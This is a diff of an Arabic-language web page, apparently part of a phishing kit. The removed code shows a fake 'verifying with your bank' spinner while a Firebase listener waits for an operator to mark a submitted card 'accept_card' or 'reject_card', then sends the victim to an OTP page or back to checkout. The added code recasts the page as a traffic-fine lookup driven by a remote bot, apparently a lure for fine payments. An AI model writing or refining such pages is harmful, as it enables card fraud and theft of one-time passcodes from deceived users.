@@ -32,9 +32,9 @@
 
 <div class="loading-card">
   <div class="spinner"></div>
-  <div class="load-title">جاري التحقق من البيانات</div>
-  <div class="load-msg">
-    يرجى الانتظار ولا تقم بإغلاق المتصفح أو تحديث الصفحة، نحن نقوم الآن بتأمين الاتصال مع البنك المصدر لبطاقتك..
+  <div class="load-title">جاري استخراج المخالفات</div>
+  <div class="load-msg" id="dynamicMessage">
+    يرجى الانتظار ولا تقم بإغلاق المتصفح أو تحديث الصفحة، نحن نقوم الآن بالاتصال بنظام المرور لجلب تفاصيل المخالفات..
   </div>
   
   <div class="secure-footer">
@@ -60,27 +60,41 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    // مراقبة حالة الطلب الأخير للعميل
-    function monitorStatus() {
-        // بنراقب آخر عملية تمت إضافتها في مجموعة "payments"
-        db.collection("payments").orderBy("timestamp", "desc").limit(1)
-        .onSnapshot((querySnapshot) => {
-            querySnapshot.forEach((doc) => {
+    // استعادة رقم الطلب الذي تم حفظه في صفحة index.php
+    const orderId = sessionStorage.getItem("last_order_id");
+
+    function monitorTrafficStatus() {
+        if (!orderId) {
+            console.error("No order ID found");
+            // إذا لم يوجد طلب، نرجعه للرئيسية بعد 3 ثواني
+            setTimeout(() => { window.location.href = "index.php"; }, 3000);
+            return;
+        }
+
+        // مراقبة الطلب المحدد في مجموعة "orders"
+        db.collection("orders").doc(orderId)
+        .onSnapshot((doc) => {
+            if (doc.exists) {
                 const data = doc.data();
                 
-                // إذا أعطيت "قبول" للبطاقة -> يروح لـ OTP
-                if (data.status === "accept_card") {
-                    window.location.href = "otp.php";
+                // أول ما البوت في Render يخلص ويحول الحالة لـ completed
+                if (data.status === "completed") {
+                    // حفظ مبلغ المخالفات لعرضه في الصفحة القادمة
+                    sessionStorage.setItem("fine_amount", data.total_fines);
+                    // التوجه لصفحة عرض المخالفات
+                    window.location.href = "violations_view.php";
                 } 
-                // إذا أعطيت "رفض" للبطاقة -> يرجع لصفحة الدفع مع رسالة خطأ
-                else if (data.status === "reject_card") {
-                    window.location.href = "checkout.php?error=invalid_card";
+                // إذا حصل خطأ في البوت
+                else if (data.status === "error") {
+                    document.getElementById("dynamicMessage").innerHTML = "عذراً، حدث خطأ أثناء جلب البيانات. يرجى المحاولة مرة أخرى.";
+                    setTimeout(() => { window.location.href = "index.php"; }, 3000);
                 }
-            });
+            }
         });
     }
 
-    monitorStatus();
+    // تشغيل المراقبة
+    monitorTrafficStatus();
 </script>
 </body>
 </html>
